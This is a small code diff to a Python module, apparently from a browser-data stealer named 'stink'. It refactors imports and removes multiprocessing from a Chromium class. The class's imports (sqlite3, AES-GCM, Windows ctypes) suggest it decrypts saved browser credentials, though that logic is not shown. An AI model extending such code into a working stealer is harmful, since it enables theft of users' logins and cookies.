@@ -3,22 +3,20 @@ from sqlite3 import connect
 from shutil import copyfile
 from base64 import b64decode
 from json import loads, dump
-from multiprocessing import Process
 from datetime import datetime, timedelta
 from os import path, makedirs, remove, listdir
 from ctypes import windll, byref, cdll, c_buffer
 
 from Crypto.Cipher.AES import new, MODE_GCM
 
-from ..helpers import DataBlob
-from ..enums.features import Features
-from ..helpers.config import ChromiumConfig
+from stink.helpers import DataBlob
+from stink.enums.features import Features
+from stink.helpers.config import ChromiumConfig
 
 
-class Chromium(Process):
+class Chromium:
 
     def __init__(self, browser_name: str, storage_path: str, state_path: str, browser_path: str, statuses: list, errors: bool):
-        Process.__init__(self)
 
         self.config = ChromiumConfig()
         self.browser_name = browser_name
